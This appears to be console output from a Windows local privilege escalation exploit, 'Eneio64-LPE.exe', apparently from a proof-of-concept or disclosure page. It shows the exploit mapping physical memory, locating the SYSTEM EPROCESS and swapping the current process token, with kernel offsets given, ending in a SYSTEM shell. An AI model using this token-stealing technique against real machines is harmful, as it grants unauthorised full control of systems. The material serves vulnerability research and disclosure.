```
C:\Users\Public>.\Eneio64-LPE.exe
[+] Total physical memory: ~0x7fef2000 bytes
[+] Mapped physical memory at 000002A3A4FC0000
[+] Leaking System EPROCESS
[+] Opened handle to SYSTEM process (PID 4)
>    Current PID:  3932
>    Handle value: 0x5c
[+] Querying SystemHandleInformation table of current process
[+] Handle table queried successfully
>    Buffer size:    1048576 bytes
>    Resize rounds:  15
>    Total handles:  29211
[+] Searching for handle 0x5c in handle table
[+] Match found at index 29183 / 29211
>    PID:                      3932
>    Handle:                   0x5c
>    Object (System EPROCESS): 0xffff858ca1885040
[+] Searching for current process token. Walking ActiveProcessLinks from System Flink (System EPROCESS + 0x448) to current PID
[+] Next Flink addr - 0x448 = Next EPROCESS
[+] Found current process (PID 3932) token at [0x72cd25f8]
[+] Patching current token with SYSTEM token
[!] ==== Flink addr of current PID - EPROCESS ActiveProcessLinks Offset (0x448) + EPROCESS Token Offset (0x4B8) = Current Token ====
[+] Token replaced.
Microsoft Windows [Version 10.0.20348.2849]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Public>whoami
nt authority\system

```


For educational use only!
